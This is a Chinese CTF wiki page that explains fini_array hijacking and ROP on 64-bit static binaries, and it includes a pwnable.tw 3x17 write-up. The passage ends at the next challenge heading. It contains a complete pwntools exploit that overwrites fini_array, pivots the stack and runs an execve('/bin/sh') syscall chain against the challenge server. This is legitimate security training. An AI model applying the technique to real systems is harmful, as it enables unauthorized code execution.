@@ -1,0 +1,1006 @@
+
+
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="SkYe's Wiki">
+      
+      
+        <link rel="canonical" href="https://wiki.mrskye.cn/stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/">
+      
+      
+        <meta name="author" content="SkYe">
+      
+      <link rel="shortcut icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-5.2.2">
+    
+    
+      
+        <title>劫持 64 位 fini_array 进行 ROP 攻击 - SkYe's Wiki</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.a2408e81.min.css">
+      
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.a46bcfb3.min.css">
+      
+      
+        
+        
+        <meta name="theme-color" content="#2196f3">
+      
+    
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans:300,400,400i,700%7CSource+Code+Pro&display=fallback">
+        <style>body,input{font-family:"Noto Sans",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Source Code Pro",SFMono-Regular,Consolas,Menlo,monospace}</style>
+      
+    
+    
+    
+      <link rel="stylesheet" href="../../../_static/css/extra.css">
+    
+    
+      
+        
+<link rel="preconnect dns-prefetch" href="https://www.google-analytics.com">
+<script>window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-36723568-3","wiki.mrskye.cn"),ga("set","anonymizeIp",!0),ga("send","pageview"),document.addEventListener("DOMContentLoaded",function(){document.forms.search&&document.forms.search.query.addEventListener("blur",function(){if(this.value){var e=document.location.pathname;ga("send","pageview",e+"?q="+this.value)}})}),document.addEventListener("DOMContentSwitch",function(){ga("send","pageview")})</script>
+<script async src="https://www.google-analytics.com/analytics.js"></script>
+      
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="blue" data-md-color-accent="red">
+  
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#64-fini_array-rop" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid" aria-label="Header">
+    <a href="https://wiki.mrskye.cn/" title="SkYe's Wiki" class="md-header-nav__button md-logo" aria-label="SkYe's Wiki">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 22a2 2 0 002-2V4a2 2 0 00-2-2h-6v7L9.5 7.5 7 9V2H6a2 2 0 00-2 2v16a2 2 0 002 2h12z"/></svg>
+
+    </a>
+    <label class="md-header-nav__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header-nav__title" data-md-component="header-title">
+      
+        <div class="md-header-nav__ellipsis">
+          <span class="md-header-nav__topic md-ellipsis">
+            SkYe's Wiki
+          </span>
+          <span class="md-header-nav__topic md-ellipsis">
+            
+              劫持 64 位 fini_array 进行 ROP 攻击
+            
+          </span>
+        </div>
+      
+    </div>
+    
+      <label class="md-header-nav__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active">
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header-nav__source">
+        
+<a href="https://github.com/skyedai910/wiki.mrskye.cn/" title="前往 GitHub 仓库" class="md-source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    skyedai910/wiki.mrskye.cn
+  </div>
+</a>
+      </div>
+    
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+        
+      
+      
+        
+          
+
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  <li class="md-tabs__item">
+    
+      <a href="../../.." class="md-tabs__link md-tabs__link--active">
+        Home
+      </a>
+    
+  </li>
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../KnowExam/Know%26Exam/" class="md-tabs__link">
+          Pwn
+        </a>
+      
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="https://wiki.mrskye.cn/" title="SkYe's Wiki" class="md-nav__button md-logo" aria-label="SkYe's Wiki">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 22a2 2 0 002-2V4a2 2 0 00-2-2h-6v7L9.5 7.5 7 9V2H6a2 2 0 00-2 2v16a2 2 0 002 2h12z"/></svg>
+
+    </a>
+    SkYe's Wiki
+  </label>
+  
+    <div class="md-nav__source">
+      
+<a href="https://github.com/skyedai910/wiki.mrskye.cn/" title="前往 GitHub 仓库" class="md-source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    skyedai910/wiki.mrskye.cn
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../../.." title="Home" class="md-nav__link">
+      Home
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
+    
+    <label class="md-nav__link" for="nav-2">
+      Pwn
+      <span class="md-nav__icon md-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M8.59 16.58L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.42z"/></svg>
+      </span>
+    </label>
+    <nav class="md-nav" aria-label="Pwn" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        <span class="md-nav__icon md-icon">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+        </span>
+        Pwn
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../KnowExam/Know%26Exam/" title="知识点&题目索引" class="md-nav__link">
+      知识点&题目索引
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-2" type="checkbox" id="nav-2-2">
+    
+    <label class="md-nav__link" for="nav-2-2">
+      栈溢出
+      <span class="md-nav__icon md-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M8.59 16.58L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.42z"/></svg>
+      </span>
+    </label>
+    <nav class="md-nav" aria-label="栈溢出" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-2">
+        <span class="md-nav__icon md-icon">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+        </span>
+        栈溢出
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../hijack_fini_array_ROP/" title="劫持fini_array" class="md-nav__link">
+      劫持fini_array
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-3" type="checkbox" id="nav-2-3">
+    
+    <label class="md-nav__link" for="nav-2-3">
+      格式化字符串
+      <span class="md-nav__icon md-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M8.59 16.58L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.42z"/></svg>
+      </span>
+    </label>
+    <nav class="md-nav" aria-label="格式化字符串" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-3">
+        <span class="md-nav__icon md-icon">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+        </span>
+        格式化字符串
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../fmtstr/fmtstr_exploit/" title="格式化字符串漏洞利用" class="md-nav__link">
+      格式化字符串漏洞利用
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../fmtstr/fmtstr_example/" title="格式化字符串漏洞例子" class="md-nav__link">
+      格式化字符串漏洞例子
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../fmtstr/Bilnd_Pwn/" title="格式化字符串盲打" class="md-nav__link">
+      格式化字符串盲打
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-4" type="checkbox" id="nav-2-4">
+    
+    <label class="md-nav__link" for="nav-2-4">
+      Glibc堆相关
+      <span class="md-nav__icon md-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M8.59 16.58L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.42z"/></svg>
+      </span>
+    </label>
+    <nav class="md-nav" aria-label="Glibc堆相关" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-4">
+        <span class="md-nav__icon md-icon">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+        </span>
+        Glibc堆相关
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../glibc-heap/Introduction_heap/" title="堆介绍" class="md-nav__link">
+      堆介绍
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../glibc-heap/heap_structure/" title="堆相关数据结构" class="md-nav__link">
+      堆相关数据结构
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-5" type="checkbox" id="nav-2-5">
+    
+    <label class="md-nav__link" for="nav-2-5">
+      链接器
+      <span class="md-nav__icon md-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M8.59 16.58L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.42z"/></svg>
+      </span>
+    </label>
+    <nav class="md-nav" aria-label="链接器" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-5">
+        <span class="md-nav__icon md-icon">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+        </span>
+        链接器
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../linker/statically_linked/" title="静态链接程序利用" class="md-nav__link">
+      静态链接程序利用
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    程序起点
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#__libc_csu_fini" class="md-nav__link">
+    __libc_csu_fini 函数
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pwnabletw-3x17" class="md-nav__link">
+    pwnable.tw-3x17
+  </a>
+  
+    <nav class="md-nav" aria-label="pwnable.tw-3x17">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    保护情况
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    漏洞函数
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    思路
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exp" class="md-nav__link">
+    exp
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    参考文章
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#memory-monster-ii" class="md-nav__link">
+    Memory Monster II
+  </a>
+  
+    <nav class="md-nav" aria-label="Memory Monster II">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    保护情况
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    漏洞函数
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exp_1" class="md-nav__link">
+    exp
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    参考文章
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/skyedai910/wiki.mrskye.cn/blob/master/docs/stackoverflow/fini_array劫持/fini_array劫持.md" title="编辑此页" class="md-content__button md-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg>
+                  </a>
+                
+                
+                  
+                
+                
+                <h1 id="64-fini_array-rop">劫持 64 位 fini_array 进行 ROP 攻击</h1>
+<h2 id="_1">程序起点</h2>
+<p>程序的启动流程如图所示：</p>
+<p><img alt="" src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200627002443.png" /></p>
+<p>可以看到 main 函数不是程序起点，之前写的 格式化字符串盲打 也分析过 text 段起点是 _start 函数 。_start 函数调用__libc_start_main 完成启动和退出工作。具体看看 _start 函数：</p>
+<pre><code class="c">.text:0000000000401A60                 public start
+.text:0000000000401A60 start           proc near               ; DATA XREF: LOAD:0000000000400018↑o
+.text:0000000000401A60 ; __unwind {
+.text:0000000000401A60                 xor     ebp, ebp
+.text:0000000000401A62                 mov     r9, rdx
+.text:0000000000401A65                 pop     rsi
+.text:0000000000401A66                 mov     rdx, rsp
+.text:0000000000401A69                 and     rsp, 0FFFFFFFFFFFFFFF0h
+.text:0000000000401A6D                 push    rax
+.text:0000000000401A6E                 push    rsp
+// 以此将 fini、init、main 地址压入寄存器
+.text:0000000000401A6F                 mov     r8, offset sub_402BD0 ; fini
+.text:0000000000401A76                 mov     rcx, offset loc_402B40 ; init
+.text:0000000000401A7D                 mov     rdi, offset main
+.text:0000000000401A84                 db      67h
+.text:0000000000401A84                 call    __libc_start_main
+.text:0000000000401A8A                 hlt
+.text:0000000000401A8A ; } // starts at 401A60
+.text:0000000000401A8A start           endp
+</code></pre>
+
+<p><a href="https://refspecs.linuxfoundation.org/LSB_4.0.0/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html">__libc_start_main 定义原型</a>：</p>
+<pre><code class="c">int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (*stack_end));
+</code></pre>
+
+<p>根据 64 位传参特定得出对应寄存器值。这个执行顺序我是通过调试得出来的。（__libc_csu_init 的话是 ret2csu 利用对象。）</p>
+<pre><code class="c">rdi &lt;- main
+rcx &lt;- __libc_csu_init    //在main函数前执行
+r8 &lt;- __libc_csu_fini    //在main函数后执行
+</code></pre>
+
+<h2 id="__libc_csu_fini">__libc_csu_fini 函数</h2>
+<p>__libc_csu_fini 函数是 main 函数退出返回到 __libc_start_main 后，通过 __libc_start_main 调用的。具体看看函数：</p>
+<pre><code class="c">.text:0000000000402960 __libc_csu_fini proc near               ; DATA XREF: start+F↑o
+.text:0000000000402960 ; __unwind {
+.text:0000000000402960                 push    rbp
+.text:0000000000402961                 lea     rax, unk_4B4100
+.text:0000000000402968                 lea     rbp, _fini_array_0
+.text:000000000040296F                 push    rbx
+.text:0000000000402970                 sub     rax, rbp
+.text:0000000000402973                 sub     rsp, 8
+.text:0000000000402977                 sar     rax, 3
+.text:000000000040297B                 jz      short loc_402996
+.text:000000000040297D                 lea     rbx, [rax-1]
+.text:0000000000402981                 nop     dword ptr [rax+00000000h]
+.text:0000000000402988
+.text:0000000000402988 loc_402988:                             ; CODE XREF: __libc_csu_fini+34↓j
+.text:0000000000402988                 call    qword ptr [rbp+rbx*8+0]
+.text:000000000040298C                 sub     rbx, 1
+.text:0000000000402990                 cmp     rbx, 0FFFFFFFFFFFFFFFFh
+.text:0000000000402994                 jnz     short loc_402988
+.text:0000000000402996
+.text:0000000000402996 loc_402996:                             ; CODE XREF: __libc_csu_fini+1B↑j
+.text:0000000000402996                 add     rsp, 8
+.text:000000000040299A                 pop     rbx
+.text:000000000040299B                 pop     rbp
+.text:000000000040299C                 jmp     sub_48E32C
+.text:000000000040299C ; } // starts at 402960
+.text:000000000040299C __libc_csu_fini endp
+</code></pre>
+
+<p>注意以下这三行源码，是劫持 fini_array 实现无限写进行 ROP 的关键：</p>
+<pre><code class="c">//将 fini_array[0] 的值加载到 rbp
+.text:0000000000402968                 lea     rbp, _fini_array_0
+//经过一系列运算后，这里会 call fini_array[1] ，也就是调用存储在 fini_array[1] 的指针
+.text:0000000000402988                 call    qword ptr [rbp+rbx*8+0]
+//调用完 fini_array[1] 之后再次进过一系列运算，这里会 call fini_array[0]
+.text:0000000000402988                 call    qword ptr [rbp+rbx*8+0]
+</code></pre>
+
+<p>看一下 fini_array 的代码：</p>
+<pre><code class="c">.fini_array:00000000004B40F0 _fini_array     segment para public 'DATA' use64
+.fini_array:00000000004B40F0                 assume cs:_fini_array
+.fini_array:00000000004B40F0                 ;org 4B40F0h
+.fini_array:00000000004B40F0 _fini_array_0   dq offset sub_401B00    ; DATA XREF: .text:000000000040291C↑o
+.fini_array:00000000004B40F0                                         ; __libc_csu_fini+8↑o
+.fini_array:00000000004B40F8                 dq offset sub_401580
+.fini_array:00000000004B40F8 _fini_array     ends
+</code></pre>
+
+<p>这里明确知道了 fini_array 里面存储了两个指针，调用顺序为：先 fini_array[1] ，再 fini_array[0] 。那么<strong>如果我们把 fini_array[1] 覆盖为函数 A 的地址，fini_array[0] 覆盖为 __libc_csu_fini 的地址 </strong>，当退出 main 后，程序会这样：</p>
+<pre><code>__libc_csu_fini先执行一遍fini_array[1]:addrA，返回后再执行fini_array[0]:__libc_csu_fini
+
+__libc_csu_fini先执行一遍fini_array[1]:addrA，返回后再执行fini_array[0]:__libc_csu_fini
+
+__libc_csu_fini先执行一遍fini_array[1]:addrA，返回后再执行fini_array[0]:__libc_csu_fini
+
+......
+</code></pre>
+
+<p>这个循环就会一直持续到 fini_array[0] 被覆盖为其他值。</p>
+<p>还有个点就是上面提到的源码中的 <code>lea     rbp, _fini_array_0</code> ，将 rbp 的值修改为 fini_array[0] 所在的地址，那么配合 <code>leave|ret</code> 就能将栈迁移到 fini_array + 0x10 的地址，我们就将利用函数放在这个地方。</p>
+<h2 id="pwnabletw-3x17">pwnable.tw-3x17</h2>
+<h3 id="_2">保护情况</h3>
+<p>静态链接的 64 位程序：</p>
+<pre><code class="shell">skye:~/CTF学习/fini_array劫持$ file 317
+317: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=a9f43736cc372b3d1682efa57f19a4d5c70e41d3, stripped
+</code></pre>
+
+<p>checksec 检查是没有 canary 但是根据汇编去检查<strong>是有 canary 保护</strong>的：</p>
+<pre><code class="shell">Arch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE (0x400000)
+</code></pre>
+
+<p><img alt="" src="https://mrskye.cn-gd.ufileos.com/img/2020-07-07-dmQW7YTLcYVKJeGN.png" /></p>
+<h3 id="_3">漏洞函数</h3>
+<p>题目编译的二进制文件没有符号表，可以尝试用 lscan 找到对应 sig 文件修复，或者通过字符串定位到 main 函数位置（shift+F12）。</p>
+<p>main 函数中一个任意地址写入 0x18 的功能：</p>
+<pre><code class="C">//重命名部分函数名
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int result; // eax
+  char *v4; // ST08_8
+  char buf; // [rsp+10h] [rbp-20h]
+  unsigned __int64 v6; // [rsp+28h] [rbp-8h]
+
+  v6 = __readfsqword(0x28u);
+  result = (unsigned __int8)++byte_4B9330;
+  if ( byte_4B9330 == 1 )
+  {
+    write_fun(1u, &quot;addr:&quot;, 5uLL);
+    read_fun(0, &amp;buf, 0x18uLL);//读取地址
+    v4 = (char *)(signed int)sub_40EE70((__int64)&amp;buf);
+    write_fun(1u, &quot;data:&quot;, 5uLL);
+    read_fun(0, v4, 0x18uLL);//向读取地址写入内容
+    result = 0;
+  }
+  if ( __readfsqword(0x28u) != v6 )
+    sub_44A3E0();
+  return result;
+}
+</code></pre>
+
+<h3 id="_4">思路</h3>
+<blockquote>
+<p>这条题目还有其他解法，因为用这条题目学习 <strong>fini_array 劫持</strong>就记录这种做法。其他解法：<a href="https://kirin-say.top/2019/02/08/pwnable-tw-3x17/">pwnable.tw_3x17</a></p>
+</blockquote>
+<p>静态编译程序只能用它的有东西 getshell 。写 shellcode 估计要 mprotect 给内容加上运行权限绕过 NX 保护；写个系统调用号可行一点。</p>
+<p>那就需要用到写入功能函数了，如果需要符合本文学习内容，就需要一个任意地址写的函数，刚好 main 函数就是。现在明确思路：</p>
+<ol>
+<li>
+<p>将 fini_array[1] 覆盖为 main 函数地址；fini_array[0] 覆盖为 __libc_start_fini 地址；</p>
+</li>
+<li>
+<p>依次向 fini_array + 0x10 写入系统调用号利用代码；</p>
+</li>
+<li>
+<p>写入完成后，将 fini_array[0] 覆盖为 <code>leave|ret</code>，将栈迁移到 fini_array + 0x10;</p>
+</li>
+</ol>
+<blockquote>
+<p>构建的系统调用命令：syscall(0x3b,addr_of_binsh,0,0)</p>
+<p>相当于：execve(addr_of_binsh,0,0)</p>
+<p>系统调用号查询：https://www.mrskye.cn/archives/168/</p>
+</blockquote>
+<h3 id="exp">exp</h3>
+<pre><code class="python">from pwn import *
+context.log_level = 'debug'
+
+#p = process(&quot;./317&quot;)
+p = remote(&quot;chall.pwnable.tw&quot;,10105)
+elf = process(&quot;./317&quot;)
+
+fini_array = 0x4B40F0
+main_addr = 0x401B6D
+libc_csu_fini = 0x402960
+esp = fini_array + 0x10
+leave_ret = 0x401C4B
+ret = 0x401016
+
+rop_syscall = 0x471db5
+rop_pop_rax = 0x41e4af
+rop_pop_rdx = 0x446e35
+rop_pop_rsi = 0x406c30
+rop_pop_rdi = 0x401696
+bin_sh_addr = 0x4B419A
+
+def write(addr,data):
+    p.recv()
+    p.send(str(addr))
+    p.recv()
+    p.send(data)
+
+def exp():
+    # hijack fini_array
+    #gdb.attach(p)
+    write(fini_array,p64(libc_csu_fini) + p64(main_addr))
+
+    # rop chain
+    write(bin_sh_addr,&quot;/bin/sh\x00&quot;)
+    write(esp,p64(rop_pop_rax))
+    write(esp+8,p64(0x3b))
+    write(esp+16,p64(rop_pop_rdi))
+    write(esp+24,p64(bin_sh_addr))
+    write(esp+32,p64(rop_pop_rdx))
+    write(esp+40,p64(0))
+    write(esp+48,p64(rop_pop_rsi))
+    write(esp+56,p64(0))
+    write(esp+64,p64(rop_syscall))
+
+    # stack pivoting
+    write(fini_array,p64(leave_ret) + p64(ret))
+
+if __name__ == '__main__':
+    exp()
+    p.interactive()
+</code></pre>
+
+<h3 id="_5">参考文章</h3>
+<ul>
+<li><a href="https://bbs.pediy.com/thread-259298.htm">[原创]pwnable.tw新手向write up(二) 3×17-x64静态编译程序的fini_array劫持</a></li>
+</ul>
+<h2 id="memory-monster-ii">Memory Monster II</h2>
+<blockquote>
